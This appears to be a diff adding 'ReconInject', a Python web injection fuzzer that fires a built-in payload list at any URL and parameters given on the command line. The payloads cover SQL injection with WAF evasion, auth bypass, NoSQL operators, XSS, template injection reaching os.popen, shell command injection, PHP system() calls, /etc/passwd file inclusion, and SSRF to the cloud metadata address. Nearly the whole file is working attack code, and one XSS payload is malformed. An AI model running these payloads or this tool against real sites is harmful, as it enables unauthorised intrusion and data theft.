@@ -1,0 +1,263 @@
+#!/usr/bin/env python3
+"""
+ReconInject: Advanced Modular Injection Tester
+----------------------------------------------
+Usage Examples:
+
+1. Standard Form Fuzzing (SQLi/XSS/SSTI):
+   python3 reconinject.py -u http://target.com/login.php -d "mail=test&pass=test" -sanity
+
+2. AJAX/JSON API Testing (Function Dispatchers):
+   python3 reconinject.py -u http://target.com/functions.php -d "username=t&pass=t&function=login" --json --preset AJAX
+
+3. Disable Redirects (See raw 302s):
+   python3 reconinject.py -u http://target.com/login.php -d "mail=t&pass=t" --no-follow
+"""
+
+import argparse
+import requests
+import time
+import urllib.parse
+import json
+
+# Comprehensive Payload Map
+PAYLOAD_MAP = {
+    "CODE_INJECTION": [
+        "1+1",
+        "10*10", 
+        "100-1",
+        "'a'.'b'",
+        "\"a\"+\"b\"",
+
+        "system('id')",
+        "exec('id')",
+        "passthru('id')",
+        "shell_exec('id')",
+        "phpinfo()",
+        "__import__('os').popen('id').read()",
+        "eval(compile('print(\"hello\")', '<string>', 'exec'))",
+        "exit()",
+        "die()",
+        "quit"
+    ],
+    "SQLI": [
+        "' OR 1=1 --", "admin' #", "' UNION SELECT NULL--",
+        "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--",
+        "'; WAITFOR DELAY '0:0:5'--", "\") OR (\"1\"=\"1"
+    ],
+    "BOOLEAN_SQLI": [
+        "' OR '1'='1", "' OR '1'='2", 
+        "\" OR \"1\"=\"1", "\" OR \"1\"=\"2",
+        "admin' AND '1'='1", "admin' AND '1'='2"
+    ],
+    "STRING_TAUTOLOGY": [
+        "' OR 'x'='x' #", 
+        "' OR 'a'='a' --", 
+        "' OR 'x'='x'/*", 
+        "admin' OR '1'='1'#",
+        "' || 'a'='a' #"
+    ],
+    "WAF_EVASION": [
+        "'/**/OR/**/1=1/**/#", 
+        "'%09OR%091=1%09#", 
+        "'%0aOR%0a1=1%0a#", 
+        "admin'/*", 
+        "'||1=1#"
+    ],
+    "HEX_ENCODED": [
+        "0x61646d696e", 
+        "-1 UNION SELECT 0x61646d696e", 
+        "CHAR(97,100,109,105,110)"
+    ],
+    "COLUMN_FUZZ": [
+        "' ORDER BY 1--", "' ORDER BY 5--", "' ORDER BY 10--", "' ORDER BY 100--"
+    ],
+    "SSTI": ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "{{config.__class__.__init__.__globals__['os'].popen('sleep 5').read()}}"],
+    "LDAP": ["admin*)", "(*)", "*()|&", "!(|(&)"],
+    "XSS": ["<script>alert(1)</script>", "img src=x onerror=alert(1)>", "\"><script>alert(1)</script>"],
+    "NO_QUOTE_SQLI": [
+        "1 OR 1=1", "1 OR TRUE", "1 GROUP BY 1", "1 UNION SELECT 1,2,3,4", "0x61646d696e", 
+        "admin' || '1'=='1", "' || 1==1//", '{"$ne": null}', '{"$gt": ""}', '[$ne]=1'
+    ],
+    "AUTH_BYPASS": [
+        "' or true --", "admin'--", "' or 1=1#", "' or 1=1/*", 
+        "admin' or '1'='1", "admin' or '1'='1'--", "admin' or '1'='1'#"
+    ],
+    "COMMAND_INJECTION": [
+        "; sleep 5", "| sleep 5", "& sleep 5", "`sleep 5`",
+        "$(sleep 5)", "; id", "| id", "& id"
+    ],
+    "PHP_SPECIFIC": [
+        "admin%00", "test%00' or 1=1--", "php://filter/convert.base64-encode/resource=index.php",
+        "index.php?page=../../../../etc/passwd"
+    ],
+    "HEADER_INJECTION": [
+        "test\r\nSet-Cookie: pwned=1", "test\nLocation: http://google.com"
+    ],
+    "SSRF": [
+        "http://127.0.0.1:80", "http://localhost:22", "http://169.254.169.254/latest/meta-data/"
+    ],
+    "LFI_RCE": [
+        "php://filter/convert.base64-encode/resource=functions", "../../../../etc/passwd",
+        "login.php%00", "config", "phpinfo"
+    ],
+    "NOSQL_AUTH": [
+        '{"$ne": null}', '{"$gt": ""}', "admin' || '1'=='1", "[$ne]=1"
+    ],
+    "PHP_JUGGLING": [
+        "username[]=", "password[]=", "function[]=", "0", "true"
+    ],
+    "FUNC_ENUM": [
+        "register", "admin", "logout", "reset", "debug", 
+        "ping", "upload", "user", "get_user", "test", 
+        "phpinfo", "system", "shell", "cmd"
+    ]
+}
+
+SANITY_CHARS = "'\"<>;()$7*"
+
+def parse_input_string(input_str, delimiter):
+    result = {}
+    if not input_str: return result
+    for item in input_str.split(delimiter):
+        if '=' in item:
+            key, val = item.split('=', 1)
+            result[key.strip()] = val.strip()
+    return result
+
+def parse_headers(header_str):
+    headers = {"User-Agent": "Mozilla/5.0"}
+    if not header_str: return headers
+    for h in header_str.split(';'):
+        if ':' in h:
+            k, v = h.split(':', 1)
+            headers[k.strip()] = v.strip()
+    return headers
+
+def apply_preset(headers, preset):
+    if preset and preset.upper() == "AJAX":
+        headers.update({
+            "X-Requested-With": "XMLHttpRequest",
+            "Accept": "application/json, text/javascript, */*; q=0.01",
+        })
+        if "Content-Type" not in headers:
+             headers["Content-Type"] = "application/x-www-form-urlencoded; charset=UTF-8"
+    return headers
+
+def get_baseline(args, url, headers, cookies, initial_data, proxy_dict):
+    try:
+        baseline_body = json.dumps(initial_data) if args.json else initial_data
+        start = time.time()
+        res = requests.request(args.request_type, url, headers=headers, 
+                               cookies=cookies, data=baseline_body, timeout=10, 
+                               proxies=proxy_dict, allow_redirects=not args.no_follow)
+        
+        snippet = res.text[:50].replace('\n', ' ') if res.text else "[EMPTY BODY]"
+        print(f"[*] Baseline Body Snippet: {snippet}")
+        
+        return len(res.text), time.time() - start, res.status_code
+    except Exception as e:
+        print(f"[!] Baseline failed: {e}")
+        return 0, 0, 0
+
+def test_sanitation(args, url, headers, cookies, initial_data, proxy_dict):
+    print(f"\n[*] Testing Sanitation Behavior with {SANITY_CHARS}")
+    params_to_check = [args.parameter] if args.parameter else list(initial_data.keys())
+    for param in params_to_check:
+        print(f"\n[!] Analyzing parameter: {param}")
+        current_data = initial_data.copy()
+        current_data[param] = SANITY_CHARS
+        body = json.dumps(current_data) if args.json else current_data
+        try:
+            res = requests.request(args.request_type, url, headers=headers, 
+                                   cookies=cookies, data=body, proxies=proxy_dict, 
+                                   allow_redirects=not args.no_follow)
+            for char in SANITY_CHARS:
+                if char not in res.text:
+                    print(f"    [!] Character {char} is STRIPPED or ENCODED")
+                elif f"\\{char}" in res.text:
+                    print(f"    [!] Character {char} is ESCAPED")
+                else:
+                    print(f"    [+] Character {char} is REFLECTED RAW")
+        except Exception as e:
+            print(f" [!] Error: {e}")
+
+def run_test(args):
+    headers = parse_headers(args.headers)
+    if args.preset: headers = apply_preset(headers, args.preset)
+    if args.json:
+        headers["Content-Type"] = "application/json"
+    elif args.request_type.upper() == "POST" and "Content-Type" not in headers:
+        headers["Content-Type"] = "application/x-www-form-urlencoded"
+
+    cookie_dict = parse_input_string(args.cookie, ';')
+    initial_data = parse_input_string(args.data, '&')
+    proxy_dict = {"http": args.proxy, "https": args.proxy} if args.proxy else None
+
+    base_len, base_time, base_status = get_baseline(args, args.url, headers, cookie_dict, initial_data, proxy_dict)
+    print(f"[*] Baseline established: {base_len} bytes | {base_time:.2f}s | Status: {base_status}")
+
+    if args.testsanity:
+        test_sanitation(args, args.url, headers, cookie_dict, initial_data, proxy_dict)
+
+    target_params = [args.parameter] if args.parameter else list(initial_data.keys())
+    
+    for param in target_params:
+        print(f"\n{'='*20}\n[!] ATTACKING PARAMETER: {param}\n{'='*20}")
+        categories = [args.test_type.upper()] if args.test_type else PAYLOAD_MAP.keys()
+
+        for cat in categories:
+            print(f"\n[*] Suite: {cat}")
+            for base_payload in PAYLOAD_MAP.get(cat, []):
+                test_variants = [base_payload]
+                if args.sanity and not args.json:
+                    test_variants.append(urllib.parse.quote(str(base_payload)))
+                    test_variants.append(urllib.parse.quote(urllib.parse.quote(str(base_payload))))
+
+                for variant in test_variants:
+                    current_data = initial_data.copy()
+                    current_data[param] = variant
+                    request_body = json.dumps(current_data) if args.json else current_data
+                    
+                    try:
+                        start_t = time.time()
+                        res = requests.request(args.request_type, args.url, headers=headers, 
+                                               cookies=cookie_dict, data=request_body, timeout=15, 
+                                               proxies=proxy_dict, allow_redirects=not args.no_follow)
+                        elapsed = time.time() - start_t
+                        
+                        flags = []
+                        diff = abs(len(res.text) - base_len)
+
+                        if elapsed > 5: flags.append("[!!!] TIME HIT")
+                        elif 0 < diff < 20: flags.append(f"[!] BOOLEAN HIT ({diff} byte diff)")
+                        elif diff >= 20: flags.append(f"[!] LEN CHANGE ({diff} bytes)")
+                        if res.status_code != base_status: flags.append(f"[!] STATUS: {res.status_code}")
+                        if "49" in res.text and cat == "SSTI": flags.append("[!!!] SSTI EXEC")
+                        
+                        # NEW: Redirect Detection
+                        if res.history:
+                            flags.append(f"[!] REDIRECT ({res.history[0].status_code}->{res.status_code})")
+
+                        print(f"[{res.status_code}] {elapsed:.2f}s | Len {len(res.text)} | Variant {str(variant)} {' '.join(flags)}")
+                    except requests.exceptions.Timeout:
+                        print(f"[!!!] TIMEOUT | Potential Blind Hit: {variant}")
+                    except Exception as e:
+                        print(f" [!] Error: {e}")
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description="ReconInject")
+    parser.add_argument("-u", "--url", required=True)
+    parser.add_argument("-c", "--cookie")
+    parser.add_argument("-d", "--data")
+    parser.add_argument("-p", "--parameter")
+    parser.add_argument("-R", "--request-type", default="POST")
+    parser.add_argument("-H", "--headers", help="Custom headers")
+    parser.add_argument("--json", action="store_true", help="Send data as JSON object")
+    parser.add_argument("--preset", help="Presets: AJAX")
+    parser.add_argument("-t", "--test-type")
+    parser.add_argument("-sanity", action="store_true", help="Try encoding variants (Form mode only)")
+    parser.add_argument("--testsanity", action="store_true", help="Run character reflection test")
+    parser.add_argument("--proxy")
+    parser.add_argument("--no-follow", action="store_true", help="Do not follow redirects")
+    run_test(parser.parse_args())
